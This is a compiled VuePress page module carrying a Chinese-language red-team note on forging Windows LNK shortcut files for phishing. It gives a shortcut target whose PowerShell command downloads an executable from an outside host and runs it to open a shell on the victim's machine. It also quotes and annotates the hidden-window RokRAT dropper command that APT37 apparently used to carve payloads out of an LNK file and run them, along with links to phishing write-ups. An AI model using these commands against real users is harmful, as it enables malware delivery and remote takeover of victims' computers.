import{_ as o}from"./plugin-vue_export-helper-DlAUqK2U.js";import{r as l,o as p,c as r,a as e,d as n,b as s,e as t}from"./app-BT-bWAve.js";const c={},i=e("h1",{id:"lnk伪造",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#lnk伪造"},[e("span",null,"LNK伪造")])],-1),d=e("h2",{id:"lnk-powershell",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#lnk-powershell"},[e("span",null,"LNK+Powershell")])],-1),u={href:"https://mp.weixin.qq.com/s/TbiXJ359ZXOyQYWsfVDwGA",target:"_blank",rel:"noopener noreferrer"},h={href:"https://www.4hou.com/posts/K70x",target:"_blank",rel:"noopener noreferrer"},m=t(`<p>新建一个快捷方式然后修改目标为如下信息:</p><div class="language-cmd line-numbers-mode" data-ext="cmd" data-title="cmd"><pre class="language-cmd"><code>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iwr http://100.1.1.131:8000/download/local/Code.exe -outfile $env:TEMP\\Code.exe;start-process $env:TEMP\\Code.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261143196.png" alt="image-20240626114316470"></p><p>当受害者点击该快捷方式后则会调起powershell下载恶意程序并执行上线shell</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406261144336.png" alt="image-20240626114445251"></p><hr><h2 id="office-ole-lnk" tabindex="-1"><a class="header-anchor" href="#office-ole-lnk"><span>Office OLE + LNK</span></a></h2>`,7),k={href:"https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD",target:"_blank",rel:"noopener noreferrer"},f={href:"https://www.google.com/search?q=Office+OLE+%2B+LNK&sca_esv=93393d72ee4371e2&sxsrf=ADLYWIKiLlirDtoqCKRrQ_Fnz6WimgY8yg%3A1719480748554&ei=rDF9Zoe7IcyA1e8P5ZCjwAI&ved=0ahUKEwiHwdz5vPuGAxVMQPUHHWXICCgQ4dUDCBA&uact=5&oq=Office+OLE+%2B+LNK&gs_lp=Egxnd3Mtd2l6LXNlcnAiEE9mZmljZSBPTEUgKyBMTksyBRAhGJ8FSOEgULkDWNMdcAN4AZABAZgB0AGgAdANqgEGMS4xMS4xuAEDyAEA-AEBmAIPoALGDMICChAAGLADGNYEGEfCAgQQIxgnwgIIEAAYgAQYogTCAgUQIRigAcICCxAAGIAEGJECGIoFwgIFEAAYgATCAgYQABgWGB7CAgoQABgWGAoYHhgPwgIIEAAYFhgeGA_CAggQABgWGAoYHsICCxAAGIAEGIYDGIoFmAMAiAYBkAYFkgcENC4xMaAHmjA&sclient=gws-wiz-serp",target:"_blank",rel:"noopener noreferrer"},g={href:"https://answers.microsoft.com/en-us/msoffice/forum/all/issues-in-ole-link-from-excel-to-word-for-windows/c93d2e18-8404-4a51-82f4-d3c0da8151da",target:"_blank",rel:"noopener noreferrer"},b={href:"https://v3ded.github.io/redteam/abusing-lnk-features-for-initial-access-and-persistence",target:"_blank",rel:"noopener noreferrer"},v={href:"https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk",target:"_blank",rel:"noopener noreferrer"},_=e("hr",null,null,-1),A=e("h2",{id:"apt",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#apt"},[e("span",null,"APT")])],-1),w=e("h3",{id:"rokrat",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#rokrat"},[e("span",null,"ROKRAT")])],-1),x={href:"https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat",target:"_blank",rel:"noopener noreferrer"},E={href:"https://www.4hou.com/posts/K70x",target:"_blank",rel:"noopener noreferrer"},P={href:"https://starmap.dbappsecurity.com.cn/blog/articles/2023/04/27/apt37-rokrat/",target:"_blank",rel:"noopener noreferrer"},y={href:"https://xz.aliyun.com/t/13851?time__1311=mqmxnQG%3DKDu0D%2F%2BG7DyQ5GODB07KG8f79eD&alichlgref=https%3A%2F%2Fwww.google.com%2F",target:"_blank",rel:"noopener noreferrer"},L={href:"https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA%3D%3D&mid=2247496455&idx=1&sn=0e3af7d734671a41c9d796e7f33b085d&chksm=f9ed9fb8ce9a16ae8e9714f116e0812994e0e3d13eb75d05182e623372fc5b979d70cf403f39&scene=178&cur_album_id=1375769135073951745",target:"_blank",rel:"noopener noreferrer"},$=t(`<div class="language-cmd line-numbers-mode" data-ext="cmd" data-title="cmd"><pre class="language-cmd"><code>&quot;C:\\Windows\\SyswOW64\\cmd.exe&quot; /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match &#39;system32&#39; -or $dirPath -Match &#39;Program Files&#39;) {$dirPath = &#39;C:\\Users\\Admin\\AppData\\Local\\Temp&#39;};$Lnkpath = Get-Childltem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eg 0x0001DAB452} ^| Select-Object -ExpandProperty FullName;$pdfFile = gc $Lnkpath -Encoding Byte -TotalCount 00065446 -ReadCount 00065446; $pdfPath = &#39;c:Users\\Admin\\AppData\\Local\\Temp\\230401.hwp&#39;; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; 
^&amp; $pdfPath; $exeFile = gc $Lnkpath -Encoding Byte -TotalCount 00068696 -ReadCount 00068696; $exePath = &#39;c:/Users/Admin/AppData/Local/Temp/230401.bat&#39;; sc $exePath ([byte[]]($exeFile ^| select -Skip 00065446)) -Encoding Byte; ^&amp; $exePath;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token string">&quot;C:\\Windows\\SyswOW64\\cmd.exe&quot;</span> <span class="token operator">/</span>c powershell <span class="token operator">-</span>windowstyle hidden 
<span class="token comment"># 获取当前路径</span>
<span class="token variable">$dirPath</span> = <span class="token function">Get-Location</span><span class="token punctuation">;</span> 
<span class="token comment"># 如果当前路径包含system32或者Program Files，则将 dirPtah 设置到临时目录</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dirPath</span> <span class="token operator">-Match</span> <span class="token string">&#39;system32&#39;</span> <span class="token operator">-or</span> <span class="token variable">$dirPath</span> <span class="token operator">-Match</span> <span class="token string">&#39;Program Files&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$dirPath</span> = <span class="token string">&#39;C:\\Users\\Admin\\AppData\\Local\\Temp&#39;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment"># 获取 dirPath 下文件大小为0x0001DAB452的</span>
<span class="token variable">$Lnkpath</span> = <span class="token function">Get-Childltem</span> <span class="token operator">-</span>Path <span class="token variable">$dirPath</span> <span class="token operator">-</span>Recurse <span class="token operator">*</span><span class="token punctuation">.</span>lnk ^<span class="token punctuation">|</span> <span class="token function">where-object</span> <span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">.</span>length <span class="token operator">-</span>eg 0x0001DAB452<span class="token punctuation">}</span> ^<span class="token punctuation">|</span> <span class="token function">Select-Object</span> <span class="token operator">-</span>ExpandProperty FullName<span class="token punctuation">;</span>
<span class="token comment"># Get-Contet 一次性获取 Lnkpath 对应文件开头的 65446 字节 存储到 $pdfFile</span>
<span class="token variable">$pdfFile</span> = <span class="token function">gc</span> <span class="token variable">$Lnkpath</span> <span class="token operator">-</span>Encoding Byte <span class="token operator">-</span>TotalCount 00065446 <span class="token operator">-</span>ReadCount 00065446<span class="token punctuation">;</span> 
<span class="token variable">$pdfPath</span> = <span class="token string">&#39;c:Users\\Admin\\AppData\\Local\\Temp\\230401.hwp&#39;</span><span class="token punctuation">;</span> 
<span class="token comment"># Set-Content 跳过 $pdfFile 的前 2470 字节将剩余内容 写入到 $pdfPath</span>
<span class="token function">sc</span> <span class="token variable">$pdfPath</span> <span class="token punctuation">(</span><span class="token namespace">[byte[]]</span><span class="token punctuation">(</span><span class="token variable">$pdfFile</span> ^<span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>Skip 002470<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span>Encoding Byte<span class="token punctuation">;</span> 
<span class="token comment"># 运行 $pdfPath</span>
^&amp; <span class="token variable">$pdfPath</span><span class="token punctuation">;</span> 
<span class="token comment"># 一次性获取 Lnkpath 对应文件开头的 68696 字节 存储到 $exeFile</span>
<span class="token variable">$exeFile</span> = <span class="token function">gc</span> <span class="token variable">$Lnkpath</span> <span class="token operator">-</span>Encoding Byte <span class="token operator">-</span>TotalCount 00068696 <span class="token operator">-</span>ReadCount 00068696<span class="token punctuation">;</span> 
<span class="token variable">$exePath</span> = <span class="token string">&#39;c:/Users/Admin/AppData/Local/Temp/230401.bat&#39;</span><span class="token punctuation">;</span> 
<span class="token comment"># Set-Content 跳过 $exeFile 的前 65446 字节将剩余内容 写入到 $exePath</span>
<span class="token function">sc</span> <span class="token variable">$exePath</span> <span class="token punctuation">(</span><span class="token namespace">[byte[]]</span><span class="token punctuation">(</span><span class="token variable">$exeFile</span> ^<span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>Skip 00065446<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span>Encoding Byte<span class="token punctuation">;</span> 
<span class="token comment"># 运行 $exePath</span>
^&amp; <span class="token variable">$exePath</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2),C={href:"https://xz.aliyun.com/t/13851?time__1311=mqmxnQG%3DKDu0D%2F%2BG7DyQ5GODB07KG8f79eD&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-0",target:"_blank",rel:"noopener noreferrer"},D=e("hr",null,null,-1),T=e("h2",{id:"相关链接",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#相关链接"},[e("span",null,"相关链接")])],-1),B={href:"https://www.jianshu.com/p/dcd250593698",target:"_blank",rel:"noopener noreferrer"},N={href:"https://www.cnblogs.com/f-carey/p/16542156.html#tid-eeTEc7",target:"_blank",rel:"noopener noreferrer"},F=e("hr",null,null,-1);function G(R,q){const a=l("ExternalLinkIcon");return p(),r("div",null,[i,d,e("blockquote",null,[e("p",null,[e("a",u,[n("疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com)"),s(a)])]),e("p",null,[e("a",h,[n("利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com"),s(a)])])]),m,e("blockquote",null,[e("p",null,[e("a",k,[n("常见钓鱼招式 - 先知社区 (aliyun.com)"),s(a)])])]),e("ul",null,[e("li",null,[e("a",f,[n("Office OLE + LNK - Google Search"),s(a)])]),e("li",null,[e("a",g,[n("Issues in OLE link from Excel to Word for Windows - Microsoft Community"),s(a)])]),e("li",null,[e("a",b,[n('Abusing LNK "Features" for Initial Access and Persistence (v3ded.github.io)'),s(a)])]),e("li",null,[e("a",v,[n("Phishing: OLE + LNK | Red Team Notes (ired.team)"),s(a)])])]),_,A,w,e("blockquote",null,[e("p",null,[e("a",x,[n("RokRAT（恶意软件家族） --- RokRAT (Malware Family) (fraunhofer.de)"),s(a)])]),e("p",null,[e("a",E,[n("利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com"),s(a)])]),e("p",null,[e("a",P,[n("安全星图平台 (dbappsecurity.com.cn)"),s(a)])]),e("p",null,[e("a",y,[n("APT37组织主战远控武器RokRAT，更新迭代部分执行流程 - 先知社区 (aliyun.com)"),s(a)])]),e("p",null,[e("a",L,[n("猎影追踪：APT37利用朝鲜政治话题针对韩国的攻击活动分析 (qq.com)"),s(a)])])]),$,e("p",null,[n("具体分析可以参阅 "),e("a",C,[n("APT37组织主战远控武器RokRAT，更新迭代部分执行流程 - 先知社区 (aliyun.com)"),s(a)])]),D,T,e("ul",null,[e("li",null,[e("a",B,[n("钓鱼姿势汇总 - 简书 (jianshu.com)"),s(a)])]),e("li",null,[n("TODO "),e("ul",null,[e("li",null,[e("a",N,[n("钓鱼攻击之：Lnk 文件钓鱼 - f_carey - 博客园 (cnblogs.com)"),s(a)])])])])]),F])}const I=o(c,[["render",G],["__file","index.html.vue"]]),S=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/LNK%E4%BC%AA%E9%80%A0/","title":"LNK伪造","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"LNK+Powershell","slug":"lnk-powershell","link":"#lnk-powershell","children":[]},{"level":2,"title":"Office OLE + LNK","slug":"office-ole-lnk","link":"#office-ole-lnk","children":[]},{"level":2,"title":"APT","slug":"apt","link":"#apt","children":[{"level":3,"title":"ROKRAT","slug":"rokrat","link":"#rokrat","children":[]}]},{"level":2,"title":"相关链接","slug":"相关链接","link":"#相关链接","children":[]}],"git":{"createdTime":1719393225000,"updatedTime":1721702671000,"contributors":[{"name":"233","email":"ayusummer233@gmail.com","commits":3}]},"readingTime":{"minutes":2.69,"words":807},"filePathRelative":"网络安全/钓鱼/钓鱼附件/LNK伪造/index.md","localizedDate":"2024年6月26日","excerpt":"\\n<h2>LNK+Powershell</h2>\\n<blockquote>\\n<p><a href=\\"https://mp.weixin.qq.com/s/TbiXJ359ZXOyQYWsfVDwGA\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">疑似BITTER组织利用LNK文件的攻击活动分析 (qq.com)</a></p>\\n<p><a href=\\"https://www.4hou.com/posts/K70x\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">利用武器化的 Windows 快捷方式 进行无文件 RokRat 恶意软件的部署 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p>\\n</blockquote>"}');export{I as comp,S as data};
